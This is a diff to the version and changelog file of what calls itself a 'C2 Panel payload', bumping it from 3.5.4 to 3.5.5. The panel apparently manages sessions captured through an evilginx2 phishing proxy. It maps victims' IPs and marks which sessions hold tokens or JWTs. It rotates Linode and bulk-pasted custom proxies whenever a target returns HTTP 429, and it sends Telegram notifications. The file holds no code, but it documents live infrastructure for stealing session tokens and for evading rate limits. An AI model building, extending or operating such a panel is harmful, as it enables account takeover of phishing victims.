@@ -1,4 +1,4 @@
-3.5.4
+3.5.5
 C2 Panel payload
 Dashboard Session Map: unique session IPs on a dark world map (OpenFreeMap)
 IP markers: mint = tokens, purple = JWT, red = empty; solid = one session, ring = several from the same IP
@@ -8,6 +8,7 @@ Click a marker to fly country → district → street → max zoom; live search 
 Popup: IP, country, region, city, street, session IDs, JWT/tokens/empty
 + / − step those zoom levels; globe and search X restore the default world view
 Geo is local DB-IP City Lite MMDB + ip_cache.json — no live geo HTTP API
+Custom proxies: bulk paste ip:port@login:pass, protocol HTTP / HTTPS / SOCKS5 / SOCKS5H; same assign / carousel / cards as Linode
 Includes: Linode proxy fleet, notification centre, 429 rotation, neon lynx icon + favicon, File Explorer, Services, session delete, CLEAR DATABASE, Telegram, charts, JWT-in-cookies, mobile card tables, sidebar toggle
 Installer patches evilginx2 http_proxy.go so origin HTTP 429 is reported to the panel for proxy auto-rotate
 Proxy Carousel: 429 rotates the hop to the end of the queue without detaching; live charts/IPs/card traffic from RAM
